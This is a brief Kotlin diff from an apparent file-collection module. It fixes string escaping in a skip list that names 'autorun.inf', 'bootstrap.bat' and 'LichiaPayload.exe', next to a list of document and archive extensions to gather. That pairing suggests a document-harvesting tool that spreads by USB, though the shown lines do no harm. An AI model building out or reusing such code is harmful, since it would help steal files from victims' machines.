@@ -7,7 +7,7 @@ object Collect {
         "pdf", "doc", "docx", "xls", "xlsx", "ppt", "pptx", "txt", "csv",
         "jpg", "jpeg", "png", "zip", "rar", "7z")
     val SKIP = setOf(
-        "System Volume Information", "$RECYCLE.BIN", "Lichia",
+        "System Volume Information", "\$RECYCLE.BIN", "Lichia",
         Prefs.MARKER, "bootstrap.bat", "autorun.inf", "LichiaPayload.exe")
 
     fun files(root: File, cfg: Prefs.Cfg): List<Pair<String, File>> {
